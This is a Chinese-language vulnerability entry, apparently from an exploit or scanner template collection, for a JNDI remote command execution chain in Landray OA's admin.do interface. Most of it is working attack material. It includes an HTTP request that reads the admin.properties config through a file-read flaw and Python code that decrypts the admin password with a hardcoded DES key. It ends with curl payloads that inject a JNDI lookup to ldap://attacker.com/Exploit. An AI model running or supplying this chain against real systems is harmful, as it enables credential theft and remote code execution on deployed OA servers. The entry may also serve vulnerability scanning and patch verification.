---
id: LANDRAY-ADMIN-JNDI-RCE
title: 蓝凌OA admin.do JNDI远程命令执行
product: landray-oa
vendor: 深圳蓝凌
version_affected: "EKP 全系列"
severity: CRITICAL
tags: [rce, jndi, file_read, 国产, oa, 需要认证]
fingerprint: ["蓝凌", "Landray", "admin.do", "admin.properties", "kmssAdminKey"]
---

## 漏洞描述

蓝凌OA admin.do 接口存在 JNDI 注入漏洞。攻击者先利用 custom.jsp 文件读取获取 admin 密码，DES 解密后登录 admin.do，再通过 testDbConn 方法执行 JNDI 注入。

## 影响版本

- 蓝凌EKP 全系列

## 前置条件

- 需要先利用 custom.jsp 文件读取漏洞（见 LANDRAY-OA-RCE）获取 admin 密码

## 利用步骤

### Step 1: 读取 admin 配置

```http
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
```

### Step 2: DES 解密 admin 密码

```python
from pyDes import des, ECB, PAD_PKCS5
import base64
key = b'kmssAdmi'  # kmssAdminKey 截取 8 字节
d = des(key, ECB, padmode=PAD_PKCS5)
print(d.decrypt(base64.b64decode("encrypted_password_here")))
```

### Step 3: 登录 admin.do 后 JNDI 注入

```http
POST /admin.do HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: <admin_session>

method=testDbConn&datasource=java.lang.String&url=ldap://attacker.com/Exploit
```

## Payload

```bash
# Step 1: 读取 admin 配置
curl -s -X POST "http://target/sys/ui/extend/varkind/custom.jsp" \
  -d 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'

# Step 3: JNDI 注入
curl -s -X POST "http://target/admin.do" \
  -H "Cookie: <admin_session>" \
  -d 'method=testDbConn&datasource=java.lang.String&url=ldap://attacker.com/Exploit'
```

## 验证方法

JNDI 回连确认或命令执行结果回显。
